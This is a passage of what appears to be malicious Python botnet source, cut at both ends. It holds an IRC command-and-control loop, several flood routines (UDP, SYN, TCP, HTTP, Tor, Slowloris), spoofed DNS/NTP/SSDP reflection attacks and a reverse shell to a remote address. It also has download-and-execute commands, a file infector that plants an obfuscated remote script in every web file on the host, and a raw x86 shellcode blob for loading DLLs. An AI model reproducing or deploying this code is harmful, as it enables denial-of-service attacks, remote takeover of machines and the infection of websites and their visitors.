10','samcart.com'],['\xff','wpbeginner.com'],['\x10','ssrn.com'],['\x10','lastpass.com'],['\x10','tweakers.net'],['\xff','animego.org'],['\x10','thriftbooks.com'],['\x10','homecenter.com.co'],['\x10','etnews.com'],['\x10','designhill.com'],['\xff','wavve.com'],['\x10','umh.es'],['\x10','papaki.com'],['\x10','military.com'],['\xff','infojobs.com.br'],['\x10','qwiklabs.com'],['\xff','immi.gov.au'],['\x10','stash.com'],['\x10','mps.it'],['\xff','apowersoft.com'],['\x10','impact.com'],['\xff','jasminsoftware.pt'],['\x10','filmstarts.de'],['\x10','growthhackers.com'],['\x10','hs.fi'],['\x10','rubiconproject.com'],['\x10','alchemer.com'],['\xff','mahacet.org'],['\x10','datorama.com'],['\x10','npmjs.com']]
        for i in range(threads):
            threading.Thread(target=self.__attack, args=(attkproto,targ_et,time.time()+timee)).start()
    def __send(self, targ_et, sock, soldier, attkproto, payload):
        PORTS = {
            'dns': 53,
            'ntp': 123,
            'cldap': 389,
            'snmp': 161,
            'ssdp': 1900,
        }
        udp = UDPHEADER(random.randint(1, 65535), PORTS[attkproto], payload).mkpkt(targ_et, soldier)
        ip = IPHEADER(targ_et, soldier, udp, ipproto=socket.IPPROTO_UDP).mkpkt()
        sock.sendto(ip+udp+payload, (soldier, PORTS[attkproto]))
    def fuCK(self,sackss):
        return chr(len(sackss)) + sackss
    def make_dns_query_domain(self, domain):
        parts = domain.split('.')
        parts = list(map(self.fuCK, parts))
        return ''.join(parts)
    def make_dns_request_data(self, dns_query, qtype):
        req = os.urandom(2) + "\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
        req += dns_query
        req += '\x00\x00' + qtype + '\x00\x01'
        return req
    def __attack(self, attkproto, targ_et, timeend):
        FILE_HANDLE=open("." + attkproto, "r")
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        i = 0
        while 1:
            try:
                if time.time()>=timeend or self.AELmEnMe == 1:
                    break
                soldier = FILE_HANDLE.readline().strip()
                if soldier:
                    if attkproto=='dns':
                        dnsdomain = random.choice(self.domains)
                        self.__send(targ_et, sock, soldier, attkproto, self.make_dns_request_data(self.make_dns_query_domain(dnsdomain[1]), dnsdomain[0]))
                    else:
                        self.__send(targ_et, sock, soldier, attkproto, PAYLOAD[attkproto])
                else:
                    FILE_HANDLE.seek(0)
            except:
                pass
        try:
            FILE_HANDLE.close()
        except:
            pass
    def reverseShell(self, ip, port):
        if not os.name == 'nt':
            import pty
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((ip, int(port)));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
        else:
            pass
            
    def shell_(self, cmd, SendEr):
        try:
            prosess = subprocess.Popen(cmd, stdout=subprocess.PIPE)
            while prosess.stdout.readable():
                line = prosess.stdout.readline()
                if not line:
                    break
                self.commSock.send("PRIVMSG %s :%s\n" % (SendEr,line.strip()))
        except:
            self.commSock.send("PRIVMSG %s :Failed to execute command\n" % self.channelname)
    def nth_repl(self,s, sub, repl, n):
        find = s.find(sub)
        i = find != -1
        while find != -1 and i != n:
            find = s.find(sub, find + 1)
            i += 1
        if i == n:
            return s[:find] + repl + s[find+len(sub):]
        return s
    def infectfile(self, filename):
        global mymac
        try:
            infectedfile=False
            filename=os.path.realpath(filename)
            filetimes=(os.path.getatime(filename), os.path.getmtime(filename))
            filehandle=open(filename,"rb")
            filedata=filehandle.read()
            filehandle.close()
            randvar = randomstring(8)
            rand2var = randomstring(8)
            encodedurl = b64encode("//" + self.injectdomain + "/campaign.js")
            injectscript="(function(" + rand2var + ", " + randvar + ") {" + randvar + " = " + rand2var + ".createElement('script');" + randvar + ".type = 'text/javascript';" + randvar + ".async = true;" + randvar + ".src = atob('" + mymac + encodedurl + mymac + "'.replace(/" + mymac + "/gi, '')) + '?' + String(Math.random()).replace('0.','');" + rand2var + ".getElementsByTagName('body')[0].appendChild(" + randvar + ");}(document));"
            macsplit=filedata.split(mymac)
            if len(macsplit) > 1:
                if macsplit[1] != encodedurl:
                    filedata=filedata.replace(macsplit[1], encodedurl)
                    self.AkvElneS+=1
                    infectedfile = True
                elif macsplit[1] == encodedurl:
                    self.AkvElneS+=1
                    return
            else:
                if filename.endswith(".js"):
                    if "var " in filedata:
                        filedata=self.nth_repl(filedata, "var ", injectscript + "var ", 1)
                        self.AkvElneS+=1
                        infectedfile = True
                else:
                    if "</body" in filedata:
                        filedata=self.nth_repl(filedata, "</body", "<script type=" + '"' + "text/javascript" + '"' + ">" + injectscript + "</script></body", 1)
                        self.AkvElneS+=1
                        infectedfile = True
            if infectedfile:
                filehandle=open(filename, "wb")
                filehandle.write(filedata)
                filehandle.close()
            os.utime(filename, filetimes)
        except:
            pass
    def infecthtmljs(self):
        if os.name != "nt":
            self.AkvElneS=0
            for tosearch in [ele for ele in os.listdir("/") if ele not in ["proc", "bin", "sbin", "sbin", "dev", "lib", "lib64", "lost+found", "sys", "boot", "etc"]]:
                for extension in ["*.js", "*.html", "*.htm", "*.php"]:
                    for filename in os.popen("find \"/" + tosearch + "\" -type f -name \"" + extension + "\"").read().split("\n"):
                        filename = filename.replace("\r", "").replace("\n", "")
                        if "node" not in filename and 'lib' not in filename and "npm" not in filename and filename != "":
                            self.infectfile(filename)
    def dlexe(self, url, saveas):
        urllib.urlretrieve(url, saveas)
        os.startfile(saveas)
    def interpretcmd(self, argumentdata, SendEr):
        global loggedin,portlist
        try:
            if argumentdata[3]==":" + self.cmdprefix + "logout":
                loggedin=-1
                self.commSock.send("PRIVMSG %s :De-Authorization successful\n" % (SendEr))
            elif argumentdata[3]==":" + self.cmdprefix + "udpflood":
                for i in range(0, int(argumentdata[7])):
                    threading.Thread(target=self.YQYZpxFe,args=(argumentdata[4],int(argumentdata[5]),int(argumentdata[6]),)).start()
                if argumentdata[5] == "0":
                    argumentdata[5] = "random"
                self.commSock.send("PRIVMSG %s :Started UDP flood on %s:%s with %s threads\n" % (SendEr,argumentdata[4],argumentdata[5],argumentdata[7]))
            elif argumentdata[3]==":" + self.cmdprefix + "synflood":
                for i in range(0, int(argumentdata[7])):
                    threading.Thread(target=self.oBwjfHGs,args=(argumentdata[4],int(argumentdata[5]),int(argumentdata[6],))).start()
                self.commSock.send("PRIVMSG %s :Started SYN flood on %s:%s with %s threads\n" % (SendEr,argumentdata[4],argumentdata[5],argumentdata[7]))
            elif argumentdata[3]==":" + self.cmdprefix + "tcpflood":
                for i in range(0, int(argumentdata[7])):
                    threading.Thread(target=self.oBTwCjfHGPs,args=(argumentdata[4],int(argumentdata[5]),int(argumentdata[6],))).start()
                self.commSock.send("PRIVMSG %s :Started TCP flood on %s:%s with %s threads\n" % (SendEr,argumentdata[4],argumentdata[5],argumentdata[7]))
            elif argumentdata[3]==":" + self.cmdprefix + "slowloris":
                threading.Thread(target=self.UDilxaOf,args=(argumentdata[4],int(argumentdata[5]),int(argumentdata[6],))).start()
                self.commSock.send("PRIVMSG %s :Started Slowloris on %s with %s sockets\n" % (SendEr,argumentdata[4],argumentdata[5]))
            elif argumentdata[3]==":" + self.cmdprefix + "httpflood":
                for i in range(0, int(argumentdata[7])):
                    threading.Thread(target=self.IVewnlka,args=(argumentdata[4],argumentdata[5],int(argumentdata[6]),)).start()
                self.commSock.send("PRIVMSG %s :Started HTTP flood on URL: %s with %s threads\n" % (SendEr,argumentdata[4],argumentdata[7]))
            elif argumentdata[3]==":" + self.cmdprefix + "torflood":
                try:
                    import socks
                except:
                    f=open("socks.py", "w")
                    f.write(urllib2.urlopen("https://raw.githubusercontent.com/mikedougherty/SocksiPy/master/socks.py").read())
                    f.close()
                    try:
                        import socks
                        try:
                            os.remove("socks.py")
                            os.remove("socks.pyc")
                        except:
                            pass
                    except:
                        self.commSock.send("PRIVMSG %s :Unable to initilize socks module.\n" % (SendEr))
                for i in range(0, int(argumentdata[7])):
                    threading.Thread(target=self.IVewnlkaTor,args=(argumentdata[4],argumentdata[5],int(argumentdata[6]),)).start()
                self.commSock.send("PRIVMSG %s :Started Tor HTTP flood on URL: %s with %s threads\n" % (SendEr,argumentdata[4],argumentdata[7]))
            elif argumentdata[3]==":" + self.cmdprefix + "loadamp":
                self.commSock.send("PRIVMSG %s :Downloading %s list from %s\n" % (SendEr,argumentdata[4],argumentdata[5]))
                threading.Thread(target=urllib.urlretrieve, args=(argumentdata[5], "."+argumentdata[4],)).start()
            elif argumentdata[3]==":" + self.cmdprefix + "reconnect":
                qsPrHtiu = 0
                try:
                    self.commSock.close()
                except:
                    pass
                self.IRCConnect()
            elif argumentdata[3]==":" + self.cmdprefix + "reflect":
                try:
                    if not os.path.exists("."+argumentdata[4]):
                        self.commSock.send("PRIVMSG %s :Please load this type of amp list first\n" % (SendEr))
                        return
                    self.commSock.send("PRIVMSG %s :Started %s amp flood on %s with %s threads\n" % (SendEr,argumentdata[4],argumentdata[5],argumentdata[7]))
                    self.ATTAKMYBRUDDA(argumentdata[4], socket.gethostbyname(argumentdata[5]), int(argumentdata[6]), int(argumentdata[7]))
                except:
                    pass
            elif argumentdata[3]==":" + self.cmdprefix + "addport":
                if int(argumentdata[4]) not in portlist:
                    portlist.append(int(argumentdata[4]))
                    self.commSock.send("PRIVMSG %s :Added port %s to scanner\n" % (SendEr,argumentdata[4]))
            elif argumentdata[3]==":" + self.cmdprefix + "delport":
                if int(argumentdata[4]) in portlist:
                    portlist.remove(int(argumentdata[4]))
                    self.commSock.send("PRIVMSG %s :Removed port %s from scanner\n" % (SendEr,argumentdata[4]))
            elif argumentdata[3]==":" + self.cmdprefix + "ports":
                self.commSock.send("PRIVMSG %s :I am currently scanning %s\n"% (SendEr,str(portlist)))
            elif argumentdata[3]==":" + self.cmdprefix + "injectcount":
                self.commSock.send("PRIVMSG %s :I have injected into %s files total\n" % (SendEr, self.AkvElneS))
            elif argumentdata[3]==":" + self.cmdprefix + "reinject":
                threading.Thread(target=self.infecthtmljs).start()
                self.commSock.send("PRIVMSG %s :Re-injecting all html and js files\n" % (SendEr))
            elif argumentdata[3]==":" + self.cmdprefix + "scanner":
                if argumentdata[4]=="resume":
                    self.scannerenabled=1
                    self.commSock.send("PRIVMSG %s :Scanner resumed!\n" % (SendEr))
                else:
                    self.scannerenabled=0
                    self.commSock.send("PRIVMSG %s :Scanner paused!\n" % (SendEr))
            elif argumentdata[3]==":" + self.cmdprefix + "sniffer":
                if argumentdata[4]=="resume":
                    if self.snifferenabled==0:
                        self.snifferenabled=1
                        self.commSock.send("PRIVMSG %s :Sniffer resumed!\n" % (SendEr))
                else:
                    if self.snifferenabled==1:
                        self.snifferenabled=0
                        self.commSock.send("PRIVMSG %s :Sniffer paused!\n" % (SendEr))
            elif argumentdata[3]==":" + self.cmdprefix + "scannetrange":
                threading.Thread(target=self.CUhKIvCh,args=(argumentdata[4],argumentdata[5],argumentdata[6],)).start()
            elif argumentdata[3]==":" + self.cmdprefix + "scanstats":
                try:
                    if argumentdata[4] == "all":
                        ranges=""
                        totalscanned=0
                        foundopen=0
                        foundopen = 0
                        for index,keyname in enumerate(self.exploitstats):
                            if keyname != "gaybots":
                                ranges+=keyname + ", "
                                total1,foundopen1=self.exploitstats[keyname]
                                totalscanned+=total1
                                foundopen+=foundopen1
                        if ranges != ", ":
                            self.commSock.send("PRIVMSG %s :IP Ranges scanned: %stotal all time IPs scanned: %s, total found open: %s\n" % (SendEr, ranges,str(totalscanned), str(foundopen)))
                        else:
                            self.commSock.send("PRIVMSG %s :Scanner DB empty\n" % (SendEr))
                    elif self.exploitstats[argumentdata[4]][0]:
                        self.commSock.send("PRIVMSG %s :Scanner stats for: %s total scanned: %s, total open: %s\n" % (SendEr, argumentdata[4], str(self.exploitstats[argumentdata[4]][0]), str(self.exploitstats[argumentdata[4]][1])))
                except:
                    self.commSock.send("PRIVMSG %s :No scanner stats for: %s\n" % (SendEr, argumentdata[4]))
            elif argumentdata[3]==":" + self.cmdprefix + "clearscan":
                self.exploitstats={"gaybots":[0,0]}
                self.commSock.send("PRIVMSG %s :Scanner DB emptied\n" % (SendEr))
            elif argumentdata[3]==":" + self.cmdprefix + "revshell":
                threading.Thread(target=self.reverseShell, args=(argumentdata[4],argumentdata[5],)).start()
            elif argumentdata[3]==":" + self.cmdprefix + "shell":
                threading.Thread(target=self.shell_,args=(" ".join(argumentdata[4:]),SendEr,)).start()
            elif argumentdata[3]==":" + self.cmdprefix + "download":
                try:
                    urllib.urlretrieve(argumentdata[4],argumentdata[5])
                    self.commSock.send("PRIVMSG %s :Downloaded\n" % (SendEr))
                except:
                    self.commSock.send("PRIVMSG %s :Could not download!\n" % (SendEr))
            elif argumentdata[3]==":" + self.cmdprefix + "killknight":
                os.kill(os.getpid(),9)
            elif argumentdata[3]==":" + self.cmdprefix + "execute":
                try:
                    urllib.urlretrieve(argumentdata[4],argumentdata[5])
                    if not os.name == 'nt':
                        try:
                            os.chmod(argumentdata[5], 777)
                        except:
                            pass
                    subprocess.Popen([("%s" % argumentdata[5])])
                    self.commSock.send("PRIVMSG %s :Downloaded and executed\n" % (SendEr))
                except:
                    self.commSock.send("PRIVMSG %s :Could not download or execute!\n" % (SendEr))
            elif argumentdata[3]==":" + self.cmdprefix + "killbyname":
                if os.name == "nt":
                    os.popen("taskkill /f /im %s" % argumentdata[4])
                else:
                    os.popen("pkill -9 %s" % argumentdata[4])
                    os.popen("killall -9 %s" % argumentdata[4])
                self.commSock.send("PRIVMSG %s :Killed\n" % (SendEr))
            elif argumentdata[3]==":" + self.cmdprefix + "killbypid":
                os.kill(int(argumentdata[4]),9)
                self.commSock.send("PRIVMSG %s :Killed\n" % (SendEr))
            elif argumentdata[3]==":" + self.cmdprefix + "disable":
                self.AELmEnMe=1
                self.commSock.send("PRIVMSG %s :Disabled attacks and scans!\n" % (SendEr))
            elif argumentdata[3]==":" + self.cmdprefix + "enable":
                self.AELmEnMe=0
                self.commSock.send("PRIVMSG %s :Re-enabled attacks and scans!\n" % (SendEr))
            elif argumentdata[3]==":" + self.cmdprefix + "getip":
                self.commSock.send("PRIVMSG %s :%s\n" % (SendEr,self.getMyCurrentIP()))
            elif argumentdata[3]==":" + self.cmdprefix + "ram":
                mem_kib = 0
                if os.name == "nt":
                    mem_kib = psutil.virtual_memory().total / 1024
                else:
                    meminfo = dict((i.split()[0].rstrip(':'),int(i.split()[1])) for i in open('/proc/meminfo').readlines())
                    mem_kib = meminfo['MemTotal']
                self.commSock.send("PRIVMSG %s :%s MB RAM total\n" % (SendEr, mem_kib/1024))
            elif argumentdata[3]==":" + self.cmdprefix + "update":
                try:
                    if argumentdata[5]:
                        threading.Thread(target=self.reverseShell, args=(argumentdata[4], int(argumentdata[5]),)).start()
                        self.commSock.send("PRIVMSG %s :Updating\n" % (SendEr))
                        time.sleep(10)
                        os.kill(os.getpid(),9)
                except:
                    self.commSock.send("PRIVMSG %s :Failed to start thread\n" % (SendEr))
                    pass
            elif argumentdata[3]==":" + self.cmdprefix + "visit":
                if os.name == "nt":
                    webbrowser.open(argumentdata[4])
                    self.commSock.send("PRIVMSG %s :Visited!\n" % (SendEr))
            elif argumentdata[3]==":" + self.cmdprefix + "dlexe":
                if os.name == "nt":
                    try:
                        threading.Thread(target=self.dlexe, args=(argumentdata[4], os.getenv("TEMP") + "\\" + argumentdata[5],)).start()
                        self.commSock.send("PRIVMSG %s :Download and execute task started!\n" % (SendEr))
                    except:
                        pass
            elif argumentdata[3]==":" + self.cmdprefix + "info":
                sysinfo=""
                sysinfo+="Architecture: " + platform.architecture()[0]
                sysinfo+=" Machine: " + platform.machine()
                sysinfo+=" Node: " + platform.node()
                sysinfo+=" System: " + platform.system()
                try:
                    if os.name == "nt":
                        dist = platform.platform()
                    else:
                        dist = platform.dist()
                        dist = " ".join(x for x in dist)
                        sysinfo+=" Distribution: " + dist
                except:
                    pass
                sysinfo+=" processors: "
                if os.name == "nt":
                    sysinfo+="0-" + str(multiprocessing.cpu_count()) + " "
                    sysinfo+=platform.processor()
                else:
                    with open("/proc/cpuinfo", "r")  as f:
                        info = f.readlines()
                    cpuinfo = [x.strip().split(":")[1] for x in info if "model name"  in x]
                    seencpus=[]
                    last = len(cpuinfo)
                    for index, item in enumerate(cpuinfo):
                        if item not in seencpus:
                            seencpus.append(item)
                            sysinfo+=str(index) + "-" + str(last) +  item
                        last-=1
                self.commSock.send("PRIVMSG %s :%s\n" % (SendEr, sysinfo))
            elif argumentdata[3]==":" + self.cmdprefix + "repack":
                if myfullpath.endswith(".py"):
                    try:
                        self.repackbot()
                        self.commSock.send("PRIVMSG %s :Repacked code!\n" % (SendEr))
                    except:
                        self.commSock.send("PRIVMSG %s :Failed to repack\n" % (SendEr))
                else:
                    self.commSock.send("PRIVMSG %s :Running as binary, not repacking\n" % (SendEr))
        except:
            pass
    def IRCConnect(self):
        global loggedin
        while 1:
            try:
                self.commSock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.commSock.connect((mydomain, 6697))
                self.commSock=ssl.wrap_socket(self.commSock)            
                self.commSock.send("NICK %s\n" % self.hLqhZnCt)
                self.commSock.send("USER %s * localhost :%s\n" % (self.aRHRPteL, self.pBYbuWVq))
                OPHIPOCv=""
                joinedchan=0
                loggedin=-1
                while 1:
                    try:
                        OPHIPOCv=OPHIPOCv+self.commSock.recv(2048)
                        if OPHIPOCv == "":
                            break
                        dbOkhWET=OPHIPOCv.split("\n")
                        OPHIPOCv=dbOkhWET.pop( )
                        for argumentdata in dbOkhWET:
                            ircLine=argumentdata
                            argumentdata=argumentdata.rstrip()
                            argumentdata=argumentdata.split()
                            if argumentdata[0]=="PING":
                                self.commSock.send("PONG %s\n" % argumentdata[1])
                            elif argumentdata[1]=="376" or argumentdata[1]=="422" or argumentdata[1]=="352":
                                if joinedchan == 0:
                                    self.commSock.send("JOIN %s %s\n" % (self.channelname,self.channelkey))
                                    joinedchan = 1
                            elif argumentdata[1]=="433":
                                self.VwkBkdwM=randomstring(random.randrange(8,12))
                                self.hLqhZnCt="[HAX|"+platform.system()+"|"+platform.machine()+"|"+str(multiprocessing.cpu_count())+"]"+str(self.VwkBkdwM)
                                self.commSock.send("NICK %s\n" % self.hLqhZnCt)
                            try:
                                SendEr=ircLine[1:ircLine.find('!')]
                                if self.channelname + " :" in ircLine:
                                    SendEr=self.channelname                            
                            except:
                                pass
                            if loggedin==-1:
                                try:
                                    if argumentdata[3]==":" + self.cmdprefix + "login":
                                        if sha512(argumentdata[4]).hexdigest()==self.botpasswd:
                                            loggedin=1024
                                            self.commSock.send("PRIVMSG %s :Authorization successful\n" % (SendEr))
                                        else:
                                            self.commSock.send("PRIVMSG %s :Authorization failed\n" % (SendEr))
                                        continue
                                except:
                                    pass
                            if loggedin > 0:
                                try:
                                    self.interpretcmd(argumentdata, SendEr)
                                except:
                                    pass
                    except:
                        try:
                            self.commSock.send("NOTICE " + self.hLqhZnCt + " :PING\n")
                            continue
                        except:
                            break
            except:
                continue
MACHINE_IA64=512
MACHINE_AMD64=34404
def is64BitDLL(bytes):
    header_offset = struct.unpack("<L", bytes[60:64])[0]
    macheine = struct.unpack("<H", bytes[header_offset+4:header_offset+4+2])[0]
    if macheine == MACHINE_IA64 or macheine == MACHINE_AMD64:
        return True   
    return False
def ConvertToShellcode(dllBytes, functionHash=0x10, userData=b'None', asdflags=0):
    rdiShellcode32 = b'\x81\xEC\x14\x01\x00\x00\x53\x55\x56\x57\x6A\x6B\x58\x6A\x65\x66\x89\x84\x24\xCC\x00\x00\x00\x33\xED\x58\x6A\x72\x59\x6A\x6E\x5B\x6A\x6C\x5A\x6A\x33\x66\x89\x84\x24\xCE\x00\x00\x00\x66\x89\x84\x24\xD4\x00\x00\x00\x58\x6A\x32\x66\x89\x84\x24\xD8\x00\x00\x00\x58\x6A\x2E\x66\x89\x84\x24\xDA\x00\x00\x00\x58\x6A\x64\x66\x89\x84\x24\xDC\x00\x00\x00\x58\x89\xAC\x24\xB0\x00\x00\x00\x89\x6C\x24\x34\x89\xAC\x24\xB8\x00\x00\x00\x89\xAC\x24\xC4\x00\x00\x00\x89\xAC\x24\xB4\x00\x00\x00\x89\xAC\x24\xAC\x00\x00\x00\x89\xAC\x24\xE0\x00\x00\x00\x66\x89\x8C\x24\xCC\x00\x00\x00\x66\x89\x9C\x24\xCE\x00\x00\x00\x66\x89\x94\x24\xD2\x00\x00\x00\x66\x89\x84\x24\xDA\x00\x00\x00\x66\x89\x94\x24\xDC\x00\x00\x00\x66\x89\x94\x24\xDE\x00\x00\x00\xC6\x44\x24\x3C\x53\x88\x54\x24\x3D\x66\xC7\x44\x24\x3E\x65\x65\xC6\x44\x24\x40\x70\x66\xC7\x44\x24\x50\x4C\x6F\xC6\x44\x24\x52\x61\x88\x44\x24\x53\x66\xC7\x44\x24\x54\x4C\x69\xC6\x44\x24\x56\x62\x88\x4C\x24\x57\xC6\x44\x24\x58\x61\x88\x4C\x24\x59\x66\xC7\x44\x24\x5A\x79\x41\x66\xC7\x44\x24\x44\x56\x69\x88\x4C\x24\x46\x66\xC7\x44\x24\x47\x74\x75\xC6\x44\x24\x49\x61\x88\x54\x24\x4A\xC6\x44\x24\x4B\x41\x88\x54\x24\x4C\x88\x54\x24\x4D\x66\xC7\x44\x24\x4E\x6F\x63\x66\xC7\x44\x24\x5C\x56\x69\x88\x4C\x24\x5E\x66\xC7\x44\x24\x5F\x74\x75\xC6\x44\x24\x61\x61\x88\x54\x24\x62\xC6\x44\x24\x63\x50\x88\x4C\x24\x64\xC7\x44\x24\x65\x6F\x74\x65\x63\xC6\x44\x24\x69\x74\xC6\x84\x24\x94\x00\x00\x00\x46\x88\x94\x24\x95\x00\x00\x00\xC7\x84\x24\x96\x00\x00\x00\x75\x73\x68\x49\x88\x9C\x24\x9A\x00\x00\x00\x66\xC7\x84\x24\x9B\x00\x00\x00\x73\x74\x88\x8C\x24\x9D\x00\x00\x00\xC7\x84\x24\x9E\x00\x00\x00\x75\x63\x74\x69\xC6\x84\x24\xA2\x00\x00\x00\x6F\x6A\x65\x59\x88\x8C\x24\xA8\x00\x00\x00\x88\x4C\x24\x6D\x88\x4C\x24\x74\x88\x4C\x24\x79\x88\x8C\x24\x92\x00\x00\x00\xB9\x13\x9C\xBF\xBD\x88\x9C\x24\xA3\x00\x00\x00\xC7\x84\x24\xA4\x00\x00\x00\x43\x61\x63\x68\xC6\x44\x24\x6C\x47\xC7\x44\x24\x6E\x74\x4E\x61\x74\x66\xC7\x44\x24\x72\x69\x76\xC7\x44\x24\x75\x53\x79\x73\x74\x66\xC7\x44\x24\x7A\x6D\x49\x88\x5C\x24\x7C\x66\xC7\x44\x24\x7D\x66\x6F\x66\xC7\x84\x24\x80\x00\x00\x00\x52\x74\x88\x94\x24\x82\x00\x00\x00\xC6\x84\x24\x83\x00\x00\x00\x41\x88\x84\x24\x84\x00\x00\x00\x88\x84\x24\x85\x00\x00\x00\x66\xC7\x84\x24\x86\x00\x00\x00\x46\x75\x88\x9C\x24\x88\x00\x00\x00\xC7\x84\x24\x89\x00\x00\x00\x63\x74\x69\x6F\x88\x9C\x24\x8D\x00\x00\x00\x66\xC7\x84\x24\x8E\x00\x00\x00\x54\x61\xC6\x84\x24\x90\x00\x00\x00\x62\x88\x94\x24\x91\x00\x00\x00\xE8\x77\x08\x00\x00\xB9\xB5\x41\xD9\x5E\x8B\xF0\xE8\x6B\x08\x00\x00\x8B\xD8\x8D\x84\x24\xC8\x00\x00\x00\x6A\x18\x89\x84\x24\xEC\x00\x00\x00\x58\x66\x89\x84\x24\xE6\x00\x00\x00\x66\x89\x84\x24\xE4\x00\x00\x00\x8D\x44\x24\x1C\x50\x8D\x84\x24\xE8\x00\x00\x00\x89\x5C\x24\x34\x50\x55\x55\xFF\xD6\x6A\x0C\x5F\x8D\x44\x24\x44\x66\x89\x7C\x24\x14\x89\x44\x24\x18\x8D\x44\x24\x34\x50\x55\x8D\x44\x24\x1C\x66\x89\x7C\x24\x1E\x50\xFF\x74\x24\x28\xFF\xD3\x6A\x0E\x58\x66\x89\x44\x24\x14\x66\x89\x44\x24\x16\x8D\x44\x24\x5C\x89\x44\x24\x18\x8D\x84\x24\xB4\x00\x00\x00\x50\x55\x8D\x44\x24\x1C\x50\xFF\x74\x24\x28\xFF\xD3\x6A\x15\x58\x66\x89\x44\x24\x14\x66\x89\x44\x24\x16\x8D\x84\x24\x94\x00\x00\x00\x89\x44\x24\x18\x8D\x84\x24\xB8\x00\x00\x00\x50\x55\x8D\x44\x24\x1C\x50\xFF\x74\x24\x28\xFF\xD3\x6A\x13\x5E\x8D\x44\x24\x6C\x66\x89\x74\x24\x14\x89\x44\x24\x18\x8D\x84\x24\xC4\x00\x00\x00\x50\x55\x8D\x44\x24\x1C\x66\x89\x74\x24\x1E\x50\xFF\x74\x24\x28\xFF\xD3\x6A\x05\x58\x66\x89\x44\x24\x14\x66\x89\x44\x24\x16\x8D\x44\x24\x3C\x89\x44\x24\x18\x8D\x84\x24\xAC\x00\x00\x00\x50\x55\x8D\x44\x24\x1C\x50\xFF\x74\x24\x28\xFF\xD3\x8D\x84\x24\x80\x00\x00\x00\x66\x89\x74\x24\x14\x89\x44\x24\x18\x8D\x84\x24\xE0\x00\x00\x00\x50\x55\x8D\x44\x24\x1C\x66\x89\x74\x24\x1E\x50\xFF\x74\x24\x28\xFF\xD3\x8D\x44\x24\x50\x66\x89\x7C\x24\x14\x89\x44\x24\x18\x8D\x84\x24\xB0\x00\x00\x00\x50\x55\x8D\x44\x24\x1C\x66\x89\x7C\x24\x1E\x50\xFF\x74\x24\x28\xFF\xD3\x39\x6C\x24\x34\x0F\x84\x00\x07\x00\x00\x39\xAC\x24\xB4\x00\x00\x00\x0F\x84\xF3\x06\x00\x00\x39\xAC\x24\xAC\x00\x00\x00\x0F\x84\xE6\x06\x00\x00\x39\xAC\x24\xB8\x00\x00\x00\x0F\x84\xD9\x06\x00\x00\x8B\xAC\x24\xC4\x00\x00\x00\x85\xED\x0F\x84\xCA\x06\x00\x00\x8B\xBC\x24\x28\x01\x00\x00\x8B\x77\x3C\x03\xF7\x81\x3E\x50\x45\x00\x00\x0F\x85\xB2\x06\x00\x00\xB8\x4C\x01\x00\x00\x66\x39\x46\x04\x0F\x85\xA3\x06\x00\x00\xF6\x46\x38\x01\x0F\x85\x99\x06\x00\x00\x0F\xB7\x4E\x14\x33\xDB\x0F\xB7\x56\x06\x83\xC1\x24\x85\xD2\x74\x1E\x03\xCE\x83\x79\x04\x00\x8B\x46\x38\x0F\x45\x41\x04\x03\x01\x8D\x49\x28\x3B\xC3\x0F\x46\xC3\x8B\xD8\x83\xEA\x01\x75\xE4\x8D\x84\x24\x00\x01\x00\x00\x50\xFF\xD5\x8B\x8C\x24\x04\x01\x00\x00\x8D\x51\xFF\x8D\x69\xFF\xF7\xD2\x03\x6E\x50\x8D\x41\xFF\x03\xC3\x23\xEA\x23\xC2\x3B\xE8\x0F\x85\x3D\x06\x00\x00\x6A\x04\x68\x00\x30\x00\x00\x55\xFF\x76\x34\xFF\x54\x24\x44\x8B\xD8\x89\x5C\x24\x2C\x85\xDB\x75\x13\x6A\x04\x68\x00\x30\x00\x00\x55\x50\xFF\x54\x24\x44\x8B\xD8\x89\x44\x24\x2C\xF6\x84\x24\x38\x01\x00\x00\x01\x74\x23\x8B\x47\x3C\x89\x43\x3C\x8B\x4F\x3C\x3B\x4E\x54\x73\x2E\x8B\xEF\x8D\x14\x0B\x2B\xEB\x8A\x04\x2A\x41\x88\x02\x42\x3B\x4E\x54\x72\xF4\xEB\x19\x33\xED\x39\x6E\x54\x76\x12\x8B\xD7\x8B\xCB\x2B\xD3\x8A\x04\x11\x45\x88\x01\x41\x3B\x6E\x54\x72\xF4\x8B\x6B\x3C\x33\xC9\x03\xEB\x89\x4C\x24\x10\x33\xC0\x89\x6C\x24\x28\x0F\xB7\x55\x14\x83\xC2\x28\x66\x3B\x45\x06\x73\x31\x03\xD5\x33\xF6\x39\x32\x76\x19\x8B\x42\x04\x8B\x4A\xFC\x03\xC6\x03\xCB\x8A\x04\x38\x88\x04\x31\x46\x3B\x32\x72\xEB\x8B\x4C\x24\x10\x0F\xB7\x45\x06\x41\x83\xC2\x28\x89\x4C\x24\x10\x3B\xC8\x72\xD1\x8B\xC3\xC7\x84\x24\xBC\x00\x00\x00\x01\x00\x00\x00\x2B\x45\x34\x89\x44\x24\x24\x0F\x84\xC4\x00\x00\x00\x83\xBD\xA4\x00\x00\x00\x00\x0F\x84\xB7\x00\x00\x00\x8B\xB5\xA0\x00\x00\x00\x03\xF3\x83\x3E\x00\x0F\x84\xA6\x00\x00\x00\x6A\x02\x8B\xF8\x5D\x8D\x56\x08\xEB\x75\x0F\xB7\x02\x89\x44\x24\x10\x0F\xB7\xC8\x66\xC1\xE8\x0C\x66\x83\xF8\x0A\x75\x28\x8B\x16\x8B\x4C\x24\x10\x81\xE1\xFF\x0F\x00\x00\x89\x4C\x24\x10\x8D\x04\x1A\x8B\x0C\x08\x8D\x04\x1A\x8B\x54\x24\x10\x03\xCF\x89\x0C\x10\x8B\x54\x24\x24\xEB\x37\x66\x83\xF8\x03\x75\x0D\x81\xE1\xFF\x0F\x00\x00\x03\x0E\x01\x3C\x19\xEB\x24\x66\x3B\x84\x24\xBC\x00\x00\x00\x75\x07\x8B\xC7\xC1\xE8\x10\xEB\x08\x66\x3B\xC5\x75\x0E\x0F\xB7\xC7\x81\xE1\xFF\x0F\x00\x00\x03\x0E\x01\x04\x19\x03\xD5\x8B\x46\x04\x03\xC6\x89\x54\x24\x24\x3B\xD0\x0F\x85\x7A\xFF\xFF\xFF\x83\x3A\x00\x8B\xF2\x0F\x85\x6A\xFF\xFF\xFF\x